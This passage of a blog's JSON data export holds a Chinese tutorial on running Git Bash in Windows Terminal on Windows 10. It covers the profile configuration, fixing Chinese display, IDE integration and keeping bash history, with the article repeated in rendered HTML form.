命令来退出就可以。不过这样每次都输入命令太麻烦了。没关系，有[解决办法](https://felixc.at/2013/09/how-to-avoid-losing-any-history-lines/)，很简单！\n\n打开Git安装目录下的 **C:\\Git\\etc\\bash.bashrc** （具体路径以你安装的为准）文件，在末尾追加内容：\n\n```bash\nHISTFILESIZE=400000000\nHISTSIZE=10000\nPROMPT_COMMAND=\"history -a\"\nexport HISTSIZE PROMPT_COMMAND\nshopt -s histappend\n```\n\n### 题外话\n\n本文正文已经结束啦！这里给大家安利一个Windows上的小工具。我发现Windows没有类似Linux和Mac上的同应用间切换的快捷键，即 `Alt + ~` ，在打开很多相同程序的窗口时，如果仅仅是用Win自带的 `Alt + Tab` 实在是太麻烦了。\n\n恰好这个古董小软件居然还能用在Win10上：[Easy Window Switcher](https://neosmart.net/EasySwitch/)\n\n还有上面提到的JetBrains官方字体（免费），也不错的，推荐给大家：[JetBrains Mono](https://www.jetbrains.com/lp/mono/#how-to-install)\n","slug":"Win10也要愉快地使用Bash","published":1,"updated":"2024-03-25T07:31:25.860Z","comments":1,"photos":[],"link":"","_id":"cluaufh0z002ethe6f32bgrdq","content":"<p>对于习惯了Linux和Mac的同学来说，Windows自带的终端确实不太好用。其实我们完全可以用Bash取而代之。</p>\n<h3 id=\"安装Windows-Terminal\"><a href=\"#安装Windows-Terminal\" class=\"headerlink\" title=\"安装Windows Terminal\"></a>安装Windows Terminal</h3><p>自从巨硬拥抱开源之后，那是骚操作频频。Windows Terminal是一个开源项目，它本身只是一个终端容器，可以装载系统自带的CMD、PowerShell甚至是WSL子系统的终端。</p>\n<p>下载安装很简单，可以在应用商店直接搜索Terminal安装，也可以去GitHub上下载安装包：<a href=\"https://github.com/microsoft/terminal/releases\">https://github.com/microsoft/terminal/releases</a></p>\n<p><strong>注：</strong>需要Win10版本不小于1903。Win+R打开“运行”输入 <code>winver</code> 命令即可查看系统版本。</p>\n<h3 id=\"安装Git-for-Windows\"><a href=\"#安装Git-for-Windows\" class=\"headerlink\" title=\"安装Git for Windows\"></a>安装Git for Windows</h3><p>先到官网（<a href=\"https://git-scm.com/download/win\">https://git-scm.com/download/win</a>）下载 <strong>64-bit Git for Windows Setup</strong> 然后安装，基本上一路下一步，但需要注意几点最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。</p>\n<p>安装Git主要是为了它附送的Git Bash，这是本文的主角。装好后注意配置一下环境变量Path，把这几个都加上：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 具体路径以你安装时的选择为准</span></span><br><span class=\"line\">C:\\Program Files\\Git\\cmd</span><br><span class=\"line\">C:\\Program Files\\Git\\bin</span><br><span class=\"line\">C:\\Program Files\\Git\\usr\\bin</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"把Git-Bash添加到Windows-Terminal中\"><a href=\"#把Git-Bash添加到Windows-Terminal中\" class=\"headerlink\" title=\"把Git Bash添加到Windows Terminal中\"></a>把Git Bash添加到Windows Terminal中</h3><p>打开Terminal，在顶部可以找到Settings设置选项：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200224173143173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>所有设置都在一个json文件中，配置起来相当灵活，我们可以看到其中有一个list数组，对应的就是现有的终端，接下来我们在数组首位插入一段关于Git Bash的配置：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">&quot;list&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\"><span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;acrylicOpacity&quot;</span> <span class=\"punctuation\">:</span> <span class=\"number\">0.75</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 窗口透明度</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;closeOnExit&quot;</span> <span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span> <span class=\"comment\">// 关闭Terminal是否退出bash</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;colorScheme&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;Campbell&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 颜色主题</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;commandline&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;bash.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// Git Bash的相对路径，因为你配置了环境变量所以不用写绝对路径</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;cursorColor&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;#FFFFFF&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 光标颜色</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;cursorShape&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;bar&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 光标样式</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fontFace&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;JetBrains Mono&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 字体，必须是系统中已安装的字体</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fontSize&quot;</span> <span class=\"punctuation\">:</span> <span class=\"number\">11</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;guid&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6109&#125;&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 该终端的唯一id，一定要和list中其他项不同</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;historySize&quot;</span> <span class=\"punctuation\">:</span> <span class=\"number\">9001</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;icon&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:\\\\Git\\\\gwindows_logo.png&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// Terminal标签页上的图标，自己随便找个都行</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;name&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;git-bash&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 标签页上的标题</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;padding&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;0, 0, 0, 0&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 终端内容内边距</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;snapOnInput&quot;</span> <span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;startingDirectory&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;%USERPROFILE%&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 每次打开的初始目录</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;useAcrylic&quot;</span> <span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// Make changes here to the powershell.exe profile</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// Make changes here to the cmd.exe profile</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">]</span></span><br></pre></td></tr></table></figure>\n\n<p>然后把你自己瞎编的那一串guid替换本json文件上方的 <code>defaultProfile</code> 字段，这样你每次打开Windows Terminal时就会默认启动Git Bash了。有人会问怎么编guid，你可以复制已经有的，然后改一下末尾数字：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">&quot;defaultProfile&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6109&#125;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>搞定了就：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020022417543044.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解决中文无法显示的问题\"><a href=\"#解决中文无法显示的问题\" class=\"headerlink\" title=\"解决中文无法显示的问题\"></a>解决中文无法显示的问题</h3><p>打开Git安装目录下的 <strong>C:\\Git\\etc\\bash.bashrc</strong> （具体路径以你安装的为准）文件，在末尾追加一行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> LC_ALL=en_US.UTF-8</span><br></pre></td></tr></table></figure>\n\n<p>并保存，重启终端就好了。</p>\n<h3 id=\"将Bash集成到IDEA（或Android-Studio）等JB全家桶中\"><a href=\"#将Bash集成到IDEA（或Android-Studio）等JB全家桶中\" class=\"headerlink\" title=\"将Bash集成到IDEA（或Android Studio）等JB全家桶中\"></a>将Bash集成到IDEA（或Android Studio）等JB全家桶中</h3><p>有些同学可以习惯于使用IDE内部的Terminal，这样就不用切来切去。很简单其实，左上角File，然后Settings，找到Terminal这一项设置，把原来的cmd.exe改成sh的全路径即可：<code>&quot;C:\\Git\\bin\\sh.exe&quot; -login -i</code></p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020022418013520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"如何从任意文件夹目录下启动Bash\"><a href=\"#如何从任意文件夹目录下启动Bash\" class=\"headerlink\" title=\"如何从任意文件夹目录下启动Bash\"></a>如何从任意文件夹目录下启动Bash</h3><p>我们都知道Ubuntu这种Linux发行版都有在文件夹空白处鼠标右键打开终端的功能，这个很方便，不用手动cd。其实Windows也可以的。需要手动配置一下注册表，具体可以直接参考：<a href=\"https://www.zhihu.com/question/325948326\">新发布的Windows Terminal如何添加到右键菜单？</a></p>\n<p>当然，如果不想修改这些的话，我们也可以在资源管理器的地址栏中输入wt，同样能打开。快速锁定地址栏焦点的快捷键是 <code>Ctrl + L</code> ，和鼠标单击效果一样：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200226163354171.png\" alt=\"在这里插入图片描述\"></p>\n<p>然后输入 <strong>wt</strong> 再回车就打开啦：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020022616355223.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/2020022616364753.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Bash记不住history怎么办\"><a href=\"#Bash记不住history怎么办\" class=\"headerlink\" title=\"Bash记不住history怎么办\"></a>Bash记不住history怎么办</h3><p>使用过程中会发现，直接关闭Windows Terminal是不会记住bash历史记录的，但如果通过 <code>exit</code> 命令来退出就可以。不过这样每次都输入命令太麻烦了。没关系，有<a href=\"https://felixc.at/2013/09/how-to-avoid-losing-any-history-lines/\">解决办法</a>，很简单！</p>\n<p>打开Git安装目录下的 <strong>C:\\Git\\etc\\bash.bashrc</strong> （具体路径以你安装的为准）文件，在末尾追加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HISTFILESIZE=400000000</span><br><span class=\"line\">HISTSIZE=10000</span><br><span class=\"line\">PROMPT_COMMAND=<span class=\"string\">&quot;history -a&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> HISTSIZE PROMPT_COMMAND</span><br><span class=\"line\"><span class=\"built_in\">shopt</span> -s histappend</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h3><p>本文正文已经结束啦！这里给大家安利一个Windows上的小工具。我发现Windows没有类似Linux和Mac上的同应用间切换的快捷键，即 <code>Alt + ~</code> ，在打开很多相同程序的窗口时，如果仅仅是用Win自带的 <code>Alt + Tab</code> 实在是太麻烦了。</p>\n<p>恰好这个古董小软件居然还能用在Win10上：<a href=\"https://neosmart.net/EasySwitch/\">Easy Window Switcher</a></p>\n<p>还有上面提到的JetBrains官方字体（免费），也不错的，推荐给大家：<a href=\"https://www.jetbrains.com/lp/mono/#how-to-install\">JetBrains Mono</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>对于习惯了Linux和Mac的同学来说，Windows自带的终端确实不太好用。其实我们完全可以用Bash取而代之。</p>\n<h3 id=\"安装Windows-Terminal\"><a href=\"#安装Windows-Terminal\" class=\"headerlink\" title=\"安装Windows Terminal\"></a>安装Windows Terminal</h3><p>自从巨硬拥抱开源之后，那是骚操作频频。Windows Terminal是一个开源项目，它本身只是一个终端容器，可以装载系统自带的CMD、PowerShell甚至是WSL子系统的终端。</p>\n<p>下载安装很简单，可以在应用商店直接搜索Terminal安装，也可以去GitHub上下载安装包：<a href=\"https://github.com/microsoft/terminal/releases\">https://github.com/microsoft/terminal/releases</a></p>\n<p><strong>注：</strong>需要Win10版本不小于1903。Win+R打开“运行”输入 <code>winver</code> 命令即可查看系统版本。</p>\n<h3 id=\"安装Git-for-Windows\"><a href=\"#安装Git-for-Windows\" class=\"headerlink\" title=\"安装Git for Windows\"></a>安装Git for Windows</h3><p>先到官网（<a href=\"https://git-scm.com/download/win\">https://git-scm.com/download/win</a>）下载 <strong>64-bit Git for Windows Setup</strong> 然后安装，基本上一路下一步，但需要注意几点最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。</p>\n<p>安装Git主要是为了它附送的Git Bash，这是本文的主角。装好后注意配置一下环境变量Path，把这几个都加上：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 具体路径以你安装时的选择为准</span></span><br><span class=\"line\">C:\\Program Files\\Git\\cmd</span><br><span class=\"line\">C:\\Program Files\\Git\\bin</span><br><span class=\"line\">C:\\Program Files\\Git\\usr\\bin</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"把Git-Bash添加到Windows-Terminal中\"><a href=\"#把Git-Bash添加到Windows-Terminal中\" class=\"headerlink\" title=\"把Git Bash添加到Windows Terminal中\"></a>把Git Bash添加到Windows Terminal中</h3><p>打开Terminal，在顶部可以找到Settings设置选项：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200224173143173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>所有设置都在一个json文件中，配置起来相当灵活，我们可以看到其中有一个list数组，对应的就是现有的终端，接下来我们在数组首位插入一段关于Git Bash的配置：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">&quot;list&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\"><span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;acrylicOpacity&quot;</span> <span class=\"punctuation\">:</span> <span class=\"number\">0.75</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 窗口透明度</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;closeOnExit&quot;</span> <span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span> <span class=\"comment\">// 关闭Terminal是否退出bash</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;colorScheme&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;Campbell&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 颜色主题</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;commandline&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;bash.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// Git Bash的相对路径，因为你配置了环境变量所以不用写绝对路径</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;cursorColor&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;#FFFFFF&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 光标颜色</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;cursorShape&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;bar&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 光标样式</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fontFace&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;JetBrains Mono&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 字体，必须是系统中已安装的字体</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fontSize&quot;</span> <span class=\"punctuation\">:</span> <span class=\"number\">11</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;guid&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6109&#125;&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 该终端的唯一id，一定要和list中其他项不同</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;historySize&quot;</span> <span class=\"punctuation\">:</span> <span class=\"number\">9001</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;icon&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:\\\\Git\\\\gwindows_logo.png&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// Terminal标签页上的图标，自己随便找个都行</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;name&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;git-bash&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 标签页上的标题</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;padding&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;0, 0, 0, 0&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 终端内容内边距</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;snapOnInput&quot;</span> <span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;startingDirectory&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;%USERPROFILE%&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 每次打开的初始目录</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;useAcrylic&quot;</span> <span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// Make changes here to the powershell.exe profile</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// Make changes here to the cmd.exe profile</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">]</span></span><br></pre></td></tr></table></figure>\n\n<p>然后把你自己瞎编的那一串guid替换本json文件上方的 <code>defaultProfile</code> 字段，这样你每次打开Windows Terminal时就会默认启动Git Bash了。有人会问怎么编guid，你可以复制已经有的，然后改一下末尾数字：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">&quot;defaultProfile&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6109&#125;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>搞定了就：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020022417543044.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解决中文无法显示的问题\"><a href=\"#解决中文无法显示的问题\" class=\"headerlink\" title=\"解决中文无法显示的问题\"></a>解决中文无法显示的问题</h3><p>打开Git安装目录下的 <strong>C:\\Git\\etc\\bash.bashrc</strong> （具体路径以你安装的为准）文件，在末尾追加一行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> LC_ALL=en_US.UTF-8</span><br></pre></td></tr></table></figure>\n\n<p>并保存，重启终端就好了。</p>\n<h3 id=\"将Bash集成到IDEA（或Android-Studio）等JB全家桶中\"><a href=\"#将Bash集成到IDEA（或Android-Studio）等JB全家桶中\" class=\"headerlink\" title=\"将Bash集成到IDEA（或Android Studio）等JB全家桶中\"></a>将Bash集成到IDEA（或Android Studio）等JB全家桶中</h3><p>有些同学可以习惯于使用IDE内部的Terminal，这样就不用切来切去。很简单其实，左上角File，然后Settings，找到Terminal这一项设置，把原来的cmd.exe改成sh的全路径即可：<code>&quot;C:\\Git\\bin\\sh.exe&quot; -login -i</code></p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020022418013520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"如何从任意文件夹目录下启动Bash\"><a href=\"#如何从任意文件夹目录下启动Bash\" class=\"headerlink\" title=\"如何从任意文件夹目录下启动Bash\"></a>如何从任意文件夹目录下启动Bash</h3><p>我们都知道Ubuntu这种Linux发行版都有在文件夹空白处鼠标右键打开终端的功能，这个很方便，不用手动cd。其实Windows也可以的。需要手动配置一下注册表，具体可以直接参考：<a href=\"https://www.zhihu.com/question/325948326\">新发布的Windows Terminal如何添加到右键菜单？</a></p>\n<p>当然，如果不想修改这些的话，我们也可以在资源管理器的地址栏中输入wt，同样能打开。快速锁定地址栏焦点的快捷键是 <code>Ctrl + L</code> ，和鼠标单击效果一样：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200226163354171.png\" alt=\"在这里插入图片描述\"></p>\n<p>然后输入 <strong>wt</strong> 再回车就打开啦：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020022616355223.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/2020022616364753.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Bash记不住history怎么办\"><a href=\"#Bash记不住history怎么办\" class=\"headerlink\" title=\"Bash记不住history怎么办\"></a>Bash记不住history怎么办</h3><p>使用过程中会发现，直接关闭Windows Terminal是不会记住bash历史记录的，但如果通过 <code>exit</code> 命令来退出就可以。不过这样每次都输入命令太麻烦了。没关系，有<a href=\"https://felixc.at/2013/09/how-to-avoid-losing-any-history-lines/\">解决办法</a>，很简单！</p>\n<p>打开Git安装目录下的 <strong>C:\\Git\\etc\\bash.bashrc</strong> （具体路径以你安装的为准）文件，在末尾追加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HISTFILESIZE=400000000</span><br><span class=\"line\">HISTSIZE=10000</span><br><span class=\"line\">PROMPT_COMMAND=<span class=\"string\">&quot;history -a&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> HISTSIZE PROMPT_COMMAND</span><br><span class=\"line\"><span class=\"built_in\">shopt</span> -s histappend</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h3><p>本文正文已经结束啦！这里给大家安利一个Windows上的小工具。我发现Windows没有类似Linux和Mac上的同应用间切换的快捷键，即 <code>Alt + ~</code> ，在打开很多相同程序的窗口时，如果仅仅是用Win自带的 <code>Alt + Tab</code> 实在是太麻烦了。</p>\n<p>恰好这个古董小软件居然还能用在Win10上：<a href=\"https://neosmart.net/EasySwitch/\">Easy Window Switcher</a></p>\n<p>还有上面提到的JetBrains官方字体（免费），也不错的，推荐给大家：<a href=\"https://www.jetbrains.com/lp/mono/#how-to-install\">JetBrains Mono</a></p>\n"},{"layout":"post","title":"快速修改字节码并重打jar包","subtitle":"探索发现。","date":"2020-03-23T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 